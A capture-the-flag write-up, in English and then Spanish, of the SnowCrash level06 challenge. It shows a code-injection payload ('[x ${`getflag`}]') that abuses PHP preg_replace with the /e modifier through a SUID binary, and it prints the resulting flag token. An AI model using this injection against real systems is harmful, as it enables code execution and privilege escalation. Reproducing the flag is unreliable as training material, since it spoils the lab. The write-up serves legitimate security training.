# Flag 06

## Tools Used:

* `ls`, `cat`, `echo`
* Understanding of PHP, particularly `preg_replace` with the `/e` modifier (code execution vulnerability)

## Process:

Upon inspecting the files available in the `level06` home directory:

```bash
level06@SnowCrash:~$ ls -la
```

Key files found:

```
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

The `level06` binary has the **SUID** bit set and is owned by `flag06`. There is also a PHP script, which we examine:

```bash
level06@SnowCrash:~$ cat level06.php
```

The script uses `file_get_contents` and several `preg_replace` calls, including one with the deprecated and dangerous `/e` modifier, which allows execution of PHP code within regular expression replacements.

### Key observations:

1. The function `x` reads a file (passed as an argument) and applies regex replacements.
2. The `/e` modifier in `preg_replace` allows execution of the replacement string as PHP code.
3. We can inject code via a file to trigger command execution.

### Exploitation:

To exploit this, we:

1. Create a file containing malicious input using shell backticks to call `getflag`:

```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > uu4
```

2. Run the vulnerable binary on this file:

```bash
level06@SnowCrash:~$ ./level06 uu4
```

The output reveals the flag:

```
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

---

# Flag 06

## Herramientas Utilizadas:

* Comandos `ls`, `cat`, `echo`
* Conocimientos de PHP, especialmente de `preg_replace` con modificador `/e` (vulnerabilidad de ejecución de código)

## Proceso:

Al inspeccionar los archivos en el directorio de `level06`:

```bash
level06@SnowCrash:~$ ls -la
```

Archivos clave encontrados:

```
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

El ejecutable `level06` tiene el bit **SUID** y es propiedad de `flag06`. También hay un script PHP que analizamos:

```bash
level06@SnowCrash:~$ cat level06.php
```

El script usa `file_get_contents` y varias llamadas a `preg_replace`, incluyendo una con el modificador `/e`, que permite ejecutar código en tiempo de ejecución.

### Observaciones clave:

1. La función `x` lee un archivo (pasado como argumento) y aplica varias sustituciones regex.
2. El uso de `/e` en `preg_replace` permite la ejecución de código PHP malicioso.
3. Podemos inyectar código a través de un archivo para provocar la ejecución de comandos.

### Explotación:

Para explotar esta vulnerabilidad:

1. Creamos un archivo con entrada maliciosa que usa backticks para llamar a `getflag`:

```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > uu4
```

2. Ejecutamos el binario vulnerable usando este archivo:

```bash
level06@SnowCrash:~$ ./level06 uu4
```

El resultado devuelve la flag:

```
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

---

## Scripts Used:

```bash
echo '[x ${`getflag`}]' > filename
```

## Flag:

```
wiok45aaoguiboiki2tuin6ub
```
